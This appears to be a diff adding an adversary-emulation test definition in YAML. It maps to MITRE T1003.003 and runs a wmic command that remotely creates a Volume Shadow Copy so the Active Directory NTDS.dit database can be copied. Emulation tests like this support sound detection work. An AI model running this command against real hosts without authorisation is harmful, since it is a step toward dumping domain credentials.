@@ -1,0 +1,31 @@
+api_version: "2.0"
+name: Create Volume Shadow Copy remotely with WMI
+description: |
+    This test is intended to be run from a remote workstation with domain admin context.
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+args:
+    - name: drive_letter
+      type: string
+      default: C:\
+    - name: target_host
+      type: string
+      default: localhost
+uuid: d893459f-71f0-484d-9808-ec83b2b64226
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.003: NTDS'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: create-volume-shadow-copy-remotely-with-wmi
+      inline: |
+        wmic /node:"{{.Args.target_host}}" shadowcopy call create Volume={{.Args.drive_letter}}
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
